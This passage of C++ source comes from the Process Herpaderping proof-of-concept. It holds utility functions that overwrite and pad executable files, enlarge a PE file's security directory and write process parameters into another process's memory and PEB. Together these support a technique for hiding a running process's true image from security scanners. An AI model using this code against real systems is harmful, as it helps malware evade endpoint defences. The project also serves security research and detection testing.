    RETURN_IF_FAILED(SetFilePointer(TargetHandle, 0, FILE_BEGIN));

    uint64_t bytesRemaining = sourceSize; 
    std::vector<uint8_t> buffer;
    if (bytesRemaining > MaxFileBuffer)
    {
        buffer.assign(MaxFileBuffer, 0);
    }
    else
    {
        buffer.assign(SCAST(size_t)(bytesRemaining), 0);
    }

    while (bytesRemaining > 0)
    {
        if (bytesRemaining < buffer.size())
        {
            buffer.assign(SCAST(size_t)(bytesRemaining), 0);
        }

        DWORD bytesRead = 0;
        RETURN_IF_WIN32_BOOL_FALSE(ReadFile(SourceHandle,
                                            buffer.data(),
                                            SCAST(DWORD)(buffer.size()),
                                            &bytesRead,
                                            nullptr));

        bytesRemaining -= bytesRead;

        DWORD bytesWitten = 0;
        RETURN_IF_WIN32_BOOL_FALSE(WriteFile(TargetHandle,
                                             buffer.data(),
                                             SCAST(DWORD)(buffer.size()),
                                             &bytesWitten,
                                             nullptr));
    }

    if (FlushFile)
    {
        RETURN_IF_WIN32_BOOL_FALSE(FlushFileBuffers(TargetHandle));
    }
    RETURN_IF_WIN32_BOOL_FALSE(SetEndOfFile(TargetHandle));

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::OverwriteFileContentsWithPattern(
    handle_t FileHandle,
    std::span<const uint8_t> Pattern,
    bool FlushFile)
{
    uint64_t targetSize;
    RETURN_IF_FAILED(GetFileSize(FileHandle, targetSize));
    RETURN_IF_FAILED(SetFilePointer(FileHandle, 0, FILE_BEGIN));

    uint64_t bytesRemaining = targetSize; 
    std::vector<uint8_t> buffer;
    if (bytesRemaining > MaxFileBuffer)
    {
        buffer.resize(MaxFileBuffer);
        RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
    }
    else
    {
        buffer.resize(SCAST(size_t)(bytesRemaining));
        RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
    }

    while (bytesRemaining > 0)
    {
        if (bytesRemaining < buffer.size())
        {
            buffer.resize(SCAST(size_t)(bytesRemaining));
            RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
        }

        DWORD bytesWritten = 0;
        RETURN_IF_WIN32_BOOL_FALSE(WriteFile(FileHandle,
                                             buffer.data(),
                                             SCAST(DWORD)(buffer.size()),
                                             &bytesWritten,
                                             nullptr));

        bytesRemaining -= bytesWritten;
    }

    if (FlushFile)
    {
        RETURN_IF_WIN32_BOOL_FALSE(FlushFileBuffers(FileHandle));
    }

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::ExtendFileWithPattern(
    handle_t FileHandle,
    uint64_t NewFileSize,
    std::span<const uint8_t> Pattern,
    uint32_t& AppendedBytes,
    bool FlushFile)
{
    AppendedBytes = 0;

    uint64_t targetSize;
    RETURN_IF_FAILED(GetFileSize(FileHandle, targetSize));

    if (targetSize >= NewFileSize)
    {
        RETURN_LAST_ERROR_SET(ERROR_FILE_TOO_LARGE);
    }

    RETURN_IF_FAILED(SetFilePointer(FileHandle, 0, FILE_END));

    uint64_t bytesRemaining;
    bytesRemaining = (NewFileSize - targetSize);
    std::vector<uint8_t> buffer;
    if (bytesRemaining > MaxFileBuffer)
    {
        buffer.resize(MaxFileBuffer);
        RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
    }
    else
    {
        buffer.resize(SCAST(size_t)(bytesRemaining));
        RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
    }

    while (bytesRemaining > 0)
    {
        DWORD bytesWritten = 0;

        if (bytesRemaining < buffer.size())
        {
            buffer.resize(SCAST(size_t)(bytesRemaining));
            RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
        }

        RETURN_IF_WIN32_BOOL_FALSE(WriteFile(FileHandle,
                                             buffer.data(),
                                             SCAST(DWORD)(buffer.size()),
                                             &bytesWritten,
                                             nullptr));

        bytesRemaining -= bytesWritten;
        AppendedBytes += bytesWritten;
    }

    if (FlushFile)
    {
        RETURN_IF_WIN32_BOOL_FALSE(FlushFileBuffers(FileHandle));
    }

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::OverwriteFileAfterWithPattern(
    handle_t FileHandle,
    uint64_t FileOffset,
    std::span<const uint8_t> Pattern,
    uint32_t& WrittenBytes,
    bool FlushFile)
{
    WrittenBytes = 0;

    uint64_t targetSize;
    RETURN_IF_FAILED(GetFileSize(FileHandle, targetSize));

    if (FileOffset >= targetSize)
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_PARAMETER);
    }

    RETURN_IF_FAILED(SetFilePointer(FileHandle, FileOffset, FILE_BEGIN));

    uint64_t bytesRemaining;
    bytesRemaining = (targetSize - FileOffset);
    std::vector<uint8_t> buffer;
    if (bytesRemaining > MaxFileBuffer)
    {
        buffer.resize(MaxFileBuffer);
        RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
    }
    else
    {
        buffer.resize(SCAST(size_t)(bytesRemaining));
        RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
    }

    while (bytesRemaining > 0)
    {
        DWORD bytesWritten = 0;

        if (bytesRemaining < buffer.size())
        {
            buffer.resize(SCAST(size_t)(bytesRemaining));
            RETURN_IF_FAILED(FillBufferWithPattern(buffer, Pattern));
        }

        RETURN_IF_WIN32_BOOL_FALSE(WriteFile(FileHandle,
                                             buffer.data(),
                                             SCAST(DWORD)(buffer.size()),
                                             &bytesWritten,
                                             nullptr));

        bytesRemaining -= bytesWritten;
        WrittenBytes += bytesWritten;
    }

    if (FlushFile)
    {
        RETURN_IF_WIN32_BOOL_FALSE(FlushFileBuffers(FileHandle));
    }

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::ExtendFileSecurityDirectory(
    handle_t FileHandle,
    uint32_t ExtendedBy,
    bool FlushFile)
{
    uint64_t targetSize;
    RETURN_IF_FAILED(GetFileSize(FileHandle, targetSize));

    wil::unique_handle mapping;
    ULARGE_INTEGER mappingSize;
    mappingSize.QuadPart = targetSize;
    mapping.reset(CreateFileMappingW(FileHandle,
                                     nullptr,
                                     PAGE_READWRITE,
                                     mappingSize.HighPart,
                                     mappingSize.LowPart,
                                     nullptr));
    RETURN_LAST_ERROR_IF(!mapping.is_valid());

    wil::unique_mapview_ptr<void> view;
    view.reset(MapViewOfFile(mapping.get(),
                             FILE_MAP_READ | FILE_MAP_WRITE,
                             0,
                             0,
                             mappingSize.LowPart));
    RETURN_LAST_ERROR_IF(view == nullptr);

    auto dosHeader = RCAST(PIMAGE_DOS_HEADER)(view.get());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        //
        // This is not a PE file, we're done.
        //
        RETURN_LAST_ERROR_SET(ERROR_INVALID_IMAGE_HASH);
    }

    auto ntHeader = RCAST(PIMAGE_NT_HEADERS32)(Add2Ptr(view.get(), 
                                                       dosHeader->e_lfanew));
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_IMAGE_HASH);
    }

    IMAGE_DATA_DIRECTORY* secDir;
    if (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        if (ntHeader->OptionalHeader.NumberOfRvaAndSizes < IMAGE_DIRECTORY_ENTRY_SECURITY)
        {
            //
            // No security directory, we're done.
            //
            return S_OK;
        }
        secDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    }
    else if (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        auto ntHeader64 = RCAST(PIMAGE_NT_HEADERS64)(ntHeader);
        if (ntHeader64->OptionalHeader.NumberOfRvaAndSizes < IMAGE_DIRECTORY_ENTRY_SECURITY)
        {
            //
            // No security directory, we're done.
            //
            return S_OK;
        }
        secDir = &ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    }
    else
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_IMAGE_HASH);
    }

    if ((secDir->VirtualAddress) == 0 || (secDir->Size == 0))
    {
        //
        // No security directory, we're done.
        //
        return S_OK;
    }

    //
    // Extend the security directory size.
    //
    secDir->Size = (secDir->Size + ExtendedBy);

    RETURN_IF_WIN32_BOOL_FALSE(FlushViewOfFile(view.get(),
                                               mappingSize.LowPart));

    view.reset();
    mapping.reset();

    if (FlushFile)
    {
        RETURN_IF_WIN32_BOOL_FALSE(FlushFileBuffers(FileHandle));
    }

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::GetImageEntryPointRva(
    handle_t FileHandle,
    uint32_t& EntryPointRva)
{
    EntryPointRva = 0;

    uint64_t fileSize;
    RETURN_IF_FAILED(GetFileSize(FileHandle, fileSize));

    ULARGE_INTEGER mappingSize;
    wil::unique_handle mapping;
    mappingSize.QuadPart = fileSize;
    mapping.reset(CreateFileMappingW(FileHandle,
                                     nullptr,
                                     PAGE_READONLY,
                                     mappingSize.HighPart,
                                     mappingSize.LowPart,
                                     nullptr));
    RETURN_LAST_ERROR_IF(!mapping.is_valid());

    wil::unique_mapview_ptr<void> view;
    view.reset(MapViewOfFile(mapping.get(),
                             FILE_MAP_READ,
                             0,
                             0,
                             mappingSize.LowPart));
    RETURN_LAST_ERROR_IF(view == nullptr);

    auto dosHeader = RCAST(PIMAGE_DOS_HEADER)(view.get());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_IMAGE_HASH);
    }

    auto ntHeader = RCAST(PIMAGE_NT_HEADERS32)(Add2Ptr(view.get(),
                                                       dosHeader->e_lfanew));
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_IMAGE_HASH);
    }

    if (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        EntryPointRva = ntHeader->OptionalHeader.AddressOfEntryPoint;
    }
    else if (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        auto ntHeader64 = RCAST(PIMAGE_NT_HEADERS64)(ntHeader);
        EntryPointRva = ntHeader64->OptionalHeader.AddressOfEntryPoint;
    }
    else
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_IMAGE_HASH);
    }

    return S_OK;
}

class OptionalUnicodeStringHelper
{
public:

    OptionalUnicodeStringHelper(
        _In_opt_ const std::optional<std::wstring>& String) :
        m_String(String)
    {
        if (m_String.has_value())
        {
            RtlInitUnicodeString(&m_Unicode, m_String->c_str());
        }
        else
        {
            RtlInitUnicodeString(&m_Unicode, L"");
        }
    }

    PUNICODE_STRING Get()
    {
        if (m_String.has_value())
        {
            return &m_Unicode;
        }
        return nullptr;
    }

    operator PUNICODE_STRING()
    {
        return Get();
    }

private:

    const std::optional<std::wstring>& m_String;
    UNICODE_STRING m_Unicode;

};

_Use_decl_annotations_
HRESULT Utils::WriteRemoteProcessParameters(
    handle_t ProcessHandle,
    const std::wstring ImageFileName,
    const std::optional<std::wstring>& DllPath,
    const std::optional<std::wstring>& CurrentDirectory,
    const std::optional<std::wstring>& CommandLine,
    void* EnvironmentBlock,
    const std::optional<std::wstring>& WindowTitle,
    const std::optional<std::wstring>& DesktopInfo,
    const std::optional<std::wstring>& ShellInfo,
    const std::optional<std::wstring>& RuntimeData)
{
    //
    // Get the basic info for the remote PEB address.
    //
    PROCESS_BASIC_INFORMATION pbi{};
    RETURN_IF_NTSTATUS_FAILED(NtQueryInformationProcess(
                                                      ProcessHandle,
                                                      ProcessBasicInformation,
                                                      &pbi,
                                                      sizeof(pbi),
                                                      nullptr));

    //
    // Generate the process parameters to write into the process.
    //
    UNICODE_STRING imageName;
    RtlInitUnicodeString(&imageName, ImageFileName.c_str());
    OptionalUnicodeStringHelper dllPath(DllPath);
    OptionalUnicodeStringHelper commandLine(CommandLine);
    OptionalUnicodeStringHelper currentDirectory(CurrentDirectory);
    OptionalUnicodeStringHelper windowTitle(WindowTitle);
    OptionalUnicodeStringHelper desktopInfo(DesktopInfo);
    OptionalUnicodeStringHelper shellInfo(ShellInfo);
    OptionalUnicodeStringHelper runtimeData(RuntimeData);
    wil::unique_user_process_parameters params;

    //
    // Generate the process parameters and do not pass
    // RTL_USER_PROC_PARAMS_NORMALIZED, this will keep the process parameters
    // de-normalized (pointers will be offsets instead of addresses) then 
    // LdrpInitializeProcess will call RtlNormalizeProcessParameters and fix
    // them up when the process starts.
    //
    // Note: There is an exception here, the Environment pointer is not
    // de-normalized - we'll fix that up ourself.
    //
    RETURN_IF_NTSTATUS_FAILED(RtlCreateProcessParametersEx(
                                            &params,
                                            &imageName,
                                            dllPath,
                                            currentDirectory,
                                            commandLine,
                                            EnvironmentBlock,
                                            windowTitle,
                                            desktopInfo,
                                            shellInfo,
                                            runtimeData,
                                            0));

    //
    // Calculate the required length.
    //
    size_t len = params.get()->MaximumLength + params.get()->EnvironmentSize;

    //
    // Allocate memory in the remote process to hold the process parameters.
    //
    auto remoteMemory = VirtualAllocEx(ProcessHandle,
                                       nullptr,
                                       len,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    RETURN_IF_NULL_ALLOC(remoteMemory);

    //
    // Okay we have some memory in the remote process, go do the final fix-ups.
    //
    if (params.get()->Environment != nullptr)
    {
        //
        // The environment block will always be right after the length, which
        // is the size of RTL_USER_PROCESS_PARAMETERS plus any extra field
        // data.
        //
        params.get()->Environment = Add2Ptr(remoteMemory, params.get()->Length);
    }

    //
    // Write the parameters into the remote process.
    //
    RETURN_IF_WIN32_BOOL_FALSE(WriteProcessMemory(ProcessHandle,
                                                  remoteMemory,
                                                  params.get(),
                                                  len,
                                                  nullptr));

    //
    // Write the parameter pointer to the remote process PEB.
    //
    RETURN_IF_WIN32_BOOL_FALSE(WriteProcessMemory(
                                 ProcessHandle,
                                 Add2Ptr(pbi.PebBaseAddress,
                                         FIELD_OFFSET(PEB, ProcessParameters)),
                                 &remoteMemory,
                                 sizeof(remoteMemory),
                                 nullptr));

    return S_OK;
}
```

`source/ProcessHerpaderping/utils.hpp`:

```hpp
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/utils.hpp
// Author:   Johnny Shaw
// Abstract: Utility functionality for herpaderping. 
//
#pragma once

namespace Log
{

    constexpr static uint32_t Success{     0x00000001ul };
    constexpr static uint32_t Information{ 0x00000002ul };
    constexpr static uint32_t Warning{     0x00000004ul };
    constexpr static uint32_t Error{       0x00000008ul };
    constexpr static uint32_t Context{     0x00000010ul };
    constexpr static uint32_t Debug{       0x80000000ul };

}

namespace Utils 
{
    /// <summary>
    /// Argument parser interface.
    /// </summary>
    class IArgumentParser
    {
    public:
        virtual ~IArgumentParser() = default;

        /// <summary>
        /// Implements functionality for parsing arguments.
        /// </summary>
        /// <param name="Argc">
        /// Number of command line arguments.
        /// </param>
        /// <param name="Argv">
        /// Command line arguments.
        /// </param>
        /// <returns>
        /// Success if arguments were parsed successfully. Failure otherwise.
        /// </returns>
        _Must_inspect_result_ virtual HRESULT ParseArguments(
            _In_ int Argc,
            _In_reads_(Argc) const wchar_t* Argv[]) = 0;

        /// <summary>
        /// Implements retrieving the argument usage.
        /// </summary>
        /// <returns>
        /// Argument usage.
        /// </returns>
        virtual std::wstring_view GetUsage() const = 0;

        /// <summary>
        /// Provides the interface an opportunity to validate the parsed 
        /// arguments. If the arguments are invalid (for example, two options 
        /// are used that may not be specified together) the implementation 
        /// may return failure here to indicate the arguments are invalid.
        /// </summary>
        _Must_inspect_result_ virtual HRESULT ValidateArguments() const = 0;

    protected:
        IArgumentParser() = default;
    };

    /// <summary>
    /// Matches a parameter argument with either short or parameter.
    /// </summary>
    /// <param name="Arg">
    /// Argument to check against short or long parameter argument 
    /// must either be prefixed explicitly as long ("--") or short ("-", "/").
    /// </param>
    /// <param name="Short">
    /// Short parameter representation (e.g. "q").
    /// </param>
    /// <param name="Long">
    /// Long parameter representation (e.g. "quiet").
    /// </param>
    /// <returns>
    /// Success if the argument matches either the short to long parameter.
    /// </returns>
    _Must_inspect_result_ HRESULT MatchParameter(
        _In_ std::wstring_view Arg,
        _In_opt_ std::optional<std::wstring_view> Short,
        _In_opt_ std::optional<std::wstring_view> Long);

    /// <summary>
    /// Checks for help options in parameters.
    /// </summary>
    /// <param name="Argc">
    /// Number of command line arguments.
    /// </param>
    /// <param name="Argv">
    /// Command line arguments.
    /// </param>
    /// <returns>
    /// Success if "--help", "-h", "/h", "-?", or "/?" are found in the 
    /// command line arguments. 
    /// </returns>
    _Must_inspect_result_ HRESULT CheckForHelpOptions(
        _In_ int Argc,
        _In_reads_(Argc) const wchar_t* Argv[]);

    /// <summary>
    /// Handles command line arguments for a argument parser. If a help 
    /// option is found or the parser fails. The function prints the header 
    /// and usage text to stdout and return failure.
    /// </summary>
    /// <param name="Argc">
    /// Number of command line arguments.
    /// </param>
    /// <param name="Argv">
    /// Command line arguments.
    /// </param>
    /// <param name="Header">
    /// Header to print before usage.
    /// </param>
    /// <param name="Parser">
    /// Argument parser to use.
    /// </param>
    /// <returns>
    /// Success if the arguments were parsed successfully. Failure if the 
    /// arguments were invalid or a help option was found. 
    /// </returns>
    _Must_inspect_result_ HRESULT HandleCommandLineArgs(
        _In_ int Argc,
        _In_reads_(Argc) const wchar_t* Argv[],
        _In_opt_ std::optional<std::wstring_view> Header,
        _Inout_ IArgumentParser& Parser);

#pragma warning(push)
#pragma warning(disable : 4634)  // xmldoc: discarding XML document comment for invalid target 
    /// <summary>
    /// Removes all occurrences of a set of values from an object.
    /// </summary>
    /// <typeparam name="T">
    /// Object type to remove elements of. Must implement erase, be forward 
    /// iterate-able, and contained value type must be move assignable.
    /// </typeparam>
    /// <param name="Object">
    /// Object to erase elements from.
    /// </param>
    /// <param name="Values">
    /// Values to remove.
    /// </param>
    template <typename T>
    void EraseAll(
        _Inout_ T& Object,
        _In_ const std::initializer_list<typename T::value_type>& Values)
    {
        for (const auto& value : Values)
        {
            Object.erase(std::remove(Object.begin(),
                                     Object.end(),
                                     value),
                         Object.end());
        }
    }
#pragma warning(pop)

    /// <summary>
    /// Formats an error code as a string.
    /// </summary>
    /// <param name="Error">
    /// Error code to format as a string.
    /// </param>
    /// <returns>
    /// Human readable string for the error code if the error is unknown a 
    /// string is returned formatted as "[number] - Unknown Error".
    /// </returns>
    std::wstring FormatError(_In_ uint32_t Error);

    /// <summary>
    /// Sets the logging mask.
    /// </summary>
    /// <param name="Level">
    /// Logging mask to set.
    /// </param>
    void SetLoggingMask(_In_ uint32_t Level);

    /// <summary>
    /// Logs a string.
    /// </summary>
    /// <param name="Level">
    /// Logging level: Log::Success, Log::Information, Log::Warning, Log:Error.
    /// </param>
    /// <param name="Format">
    /// Format for log string.
    /// </param>
    /// <param name="...">
    /// Variadic arguments for formatting.
    /// </param>
    void Log(
        _In_ uint32_t Level, 
        _Printf_format_string_ const wchar_t* Format, 
        ...);

    /// <summary>
    /// Logs a string with a specified error code appended to the formatted 
    /// string. 
    /// </summary>
    /// <param name="Level">
    /// Logging level: Log::Success, Log::Information, Log::Warning, Log:Error.
    /// </param>
    /// <param name="Error">
    /// Error code.
    /// </param>
    /// <param name="Format">
    /// Format for log string.
    /// </param>
    /// <param name="...">
    /// Variadic arguments for formatting.
    /// </param>
    /// <returns>
    /// Supplied Error
    /// </returns>
    uint32_t Log(
        _In_ uint32_t Level, 
        _In_ uint32_t Error, 
        _Printf_format_string_ const wchar_t* Format, 
        ...);

    /// <summary>
    /// Generates a buffer of a given length containing a supplied pattern.
    /// </summary>
    /// <param name="Buffer">
    /// Buffer to fill with the patter, must not be empty.
    /// </param>
    /// <param name="Pattern">
    /// Pattern to write into the buffer.
    /// </param>
    /// <returns>
    /// Success when the buffer is filled with the pattern. Failure if Buffer 
    /// is empty.
    /// </returns>
    _Must_inspect_result_ HRESULT FillBufferWithPattern(
        _Inout_ std::vector<uint8_t>& Buffer,
        _In_ std::span<const uint8_t> Pattern);

    /// <summary>
    /// Generates a buffer of random bytes of a given length.
    /// </summary>
    /// <param name="Buffer">
    /// Buffer to assign the bytes to, must not be empty.
    /// </param>
    /// <returns>
    /// Success if the buffer is filled with random bytes.
    /// </returns>
    _Must_inspect_result_ HRESULT FillBufferWithRandomBytes(
        _Inout_ std::vector<uint8_t>& Buffer);

    /// <summary>
    /// Gets a file size.
    /// </summary>
    /// <param name="FileHandle">
    /// File to get the size of.
    /// </param>
    /// <param name="FileSize">
    /// Set to the size of the file on success.
    /// </param>
    /// <returns>
    /// Success if the file size of retrieved.
    /// </returns>
    _Must_inspect_result_ HRESULT GetFileSize(
        _In_ handle_t FileHandle, 
        _Out_ uint64_t& FileSize);

    /// <summary>
    /// Sets a file pointer.
    /// </summary>
    /// <param name="FileHandle">
    /// File to set the pointer of.
    /// </param>
    /// <param name="DistanceToMove">
    /// Distance to move the file pointer.
    /// </param>
    /// <param name="MoveMethod">
    /// Move method to use (FILE_BEGIN, FILE_CURRENT, FILE_END).
    /// </param>
    /// <returns>
    /// Success if the file pointer was set (or was already set).
    /// </returns>
    _Must_inspect_result_ HRESULT SetFilePointer(
        _In_ handle_t FileHandle,
        _In_ int64_t DistanceToMove,
        _In_ uint32_t MoveMethod);

    /// <summary>
    /// Copies the contents for a source file to the target by handle.
    /// </summary>
    /// <param name="SourceHandle">
    /// Source file handle.
    /// </param>
    /// <param name="TargetHandle">
    /// Target file handle.
    /// </param>
    /// <param name="FlushFile">
    /// Flushes file buffers after copy, optional, defaults to true.
    /// </param>
    /// <returns>
    /// Success if the source file has been copied to the target.
    /// </returns>
    _Must_inspect_result_ HRESULT CopyFileByHandle(
        _In_ handle_t SourceHandle, 
        _In_ handle_t TargetHandle,
        _In_ bool FlushFile = true);

    /// <summary>
    /// Overwrites the contents of a file with a pattern.
    /// </summary>
    /// <param name="FileHandle">
    /// Target file to overwrite.
    /// </param>
    /// <param name="Pattern">
    /// Pattern write over the file content.
    /// </param>
    /// <param name="PatternLength">
    /// Length of Pattern buffer.
    /// </param>
    /// <param name="FlushFile">
    /// Flushes file buffers after overwrite, optional, defaults to true.
    /// </param>
    /// <returns>
    /// Success if the file content was overwritten.
    /// </returns>
    _Must_inspect_result_ HRESULT OverwriteFileContentsWithPattern(
        _In_ handle_t FileHandle,
        _In_ std::span<const uint8_t> Pattern,
        _In_ bool FlushFile = true);

    /// <summary>
    /// Extends file to meet a new size writes a pattern to the extension.
    /// </summary>
    /// <param name="FileHandle">
    /// Target file to extend.
    /// </param>
    /// <param name="NewFileSize">
    /// New size of the file.
    /// </param>
    /// <param name="Pattern">
    /// Pattern to use to extend the target file with.
    /// </param>
    /// <param name="AppendedBytes">
    /// Number of bytes appended.
    /// </param>
    /// <param name="FlushFile">
    /// Flushes file buffers after extension, optional, defaults to true.
    /// </param>
    /// <returns>
    /// Success if the file was extended.
    /// </returns>
    _Must_inspect_result_ HRESULT ExtendFileWithPattern(
        _In_ handle_t FileHandle,
        _In_ uint64_t NewFileSize,
        _In_ std::span<const uint8_t> Pattern,
        _Out_ uint32_t& AppendedBytes,
        _In_ bool FlushFile = true);

    /// <summary>
    /// Overwrites a file from a given offset with a pattern.
    /// </summary>
    /// <param name="FileHandle">
    /// Target file to overwrite.
    /// </param>
    /// <param name="FileOffset">
    /// Offset to begin writing from.
    /// </param>
    /// <param name="Pattern">
    /// Pattern to use to extend the target file with.
    /// </param>
    /// <param name="WrittenBytes">
    /// Number of bytes written.
    /// </param>
    /// <param name="FlushFile">
    /// Flushes file buffers after overwrite, optional, defaults to true.
    /// </param>
    /// <returns>
    /// Success if the file was overwritten.
    /// </returns>
    _Must_inspect_result_ HRESULT OverwriteFileAfterWithPattern(
        _In_ handle_t FileHandle,
        _In_ uint64_t FileOffset,
        _In_ std::span<const uint8_t> Pattern,
        _Out_ uint32_t& WrittenBytes,
        _In_ bool FlushFile = true);
    
    /// <summary>
    /// Extends a PE file security directory by a number of bytes.
    /// </summary>
    /// <param name="FileHandle">
    /// Target file handle.
    /// </param>
    /// <param name="ExtendedBy">
    /// Number of bytes to extend the security directory by.
    /// </param>
    /// <param name="FlushFile">
    /// Flushes file buffers after extension, optional, defaults to true.
    /// </param>
    /// <returns>
    /// Success if the security directory was extended. Failure if the file is 
    /// not a PE file or does not have a security directory.
    /// </returns>
    _Must_inspect_result_ HRESULT ExtendFileSecurityDirectory(
        _In_ handle_t FileHandle,
        _In_ uint32_t ExtendedBy,
        _In_ bool FlushFile = true);

    /// <summary>
    /// Retrieves the image entry point RVA from a file.
    /// </summary>
    /// <param name="FileHandle">
    /// File to parse for the entry point RVA.
    /// </param>
    /// <param name="EntryPointRva">
    /// Set to the entry point RVA on success.
    /// </param>
    /// <returns>
    /// Success if the PE image entry RVA is located.
    /// </returns>
    _Must_inspect_result_ HRESULT GetImageEntryPointRva(
        _In_ handle_t FileHandle,
        _Out_ uint32_t& EntryPointRva);

    /// <summary>
    /// Writes remote process parameters into target process.
    /// </summary>
    /// <param name="ProcessHandle">
    /// Process to write parameters into.
    /// </param>
    /// <param name="DllPath">
    /// Dll path to write into the parameters, optional.
    /// </param>
    /// <param name="ImageFileName">
    /// Image file name to write into the parameters.
    /// </param>
    /// <param name="CurrentDirectory">
    /// Current directory to write into the parameters, optional.
    /// </param>
    /// <param name="CommandLine">
    /// Command line to write into the parameters, optional.
    /// </param>
    /// <param name="EnvironmentBlock">
    /// Environment block to write into the parameters, optional.
    /// </param>
    /// <param name="WindowTitle">
    /// Window title to write into the parameters, optional.
    /// </param>
    /// <param name="DesktopInfo">
    /// Desktop info to write into the parameters, optional.
    /// </param>
    /// <param name="ShellInfo">
    /// ShellInfo to write into the parameters, optional.
    /// </param>
    /// <param name="RuntimeData">
    /// Runtime data to write into the parameters, optional.
    /// </param>
    /// <returns>
    /// Success if the remote process parameters are written.
    /// </returns>
    _Must_inspect_result_ HRESULT WriteRemoteProcessParameters(
        _In_ handle_t ProcessHandle,
        _In_ const std::wstring ImageFileName,
        _In_opt_ const std::optional<std::wstring>& DllPath,
        _In_opt_ const std::optional<std::wstring>& CurrentDirectory,
        _In_opt_ const std::optional<std::wstring>& CommandLine,
        _In_opt_ void* EnvironmentBlock,
        _In_opt_ const std::optional<std::wstring>& WindowTitle,
        _In_opt_ const std::optional<std::wstring>& DesktopInfo,
        _In_opt_ const std::optional<std::wstring>& ShellInfo,
        _In_opt_ const std::optional<std::wstring>& RuntimeData);

}

```